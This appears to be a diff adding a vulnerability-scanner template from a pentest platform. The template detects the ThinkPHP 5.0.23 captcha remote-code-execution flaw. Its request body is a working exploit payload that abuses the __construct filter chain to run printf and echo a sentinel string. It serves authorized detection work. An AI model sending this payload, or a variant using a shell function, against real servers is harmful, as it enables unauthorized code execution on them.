@@ -1,0 +1,33 @@
+id: thinkphp-5023-rce
+
+info:
+  name: ThinkPHP 5.0.23 - Captcha RCE (printf echo probe)
+  author: pentest-platform
+  severity: critical
+  description: |
+    ThinkPHP 5.0.23 allows unauthenticated RCE via /index.php?s=captcha by
+    triggering __construct with a filter chain that executes printf.
+    Non-destructive: prints a sentinel string without writing files or
+    running shell commands.
+  # safe-poc 必须在 tags 中，否则编排器下发 -tags safe-poc 时会把模板过滤掉
+  # (task-92c2b41b... 实测：no templates provided for scan)。
+  tags: safe-poc, thinkphp, rce, cve
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/index.php?s=captcha"
+      - "{{BaseURL}}/public/index.php?s=captcha"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "_method=__construct&filter[]=printf&method=get&server[REQUEST_METHOD]=pentest-rce-999999"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "pentest-rce-999999"
+      - type: status
+        status:
+          - 200
+          - 500
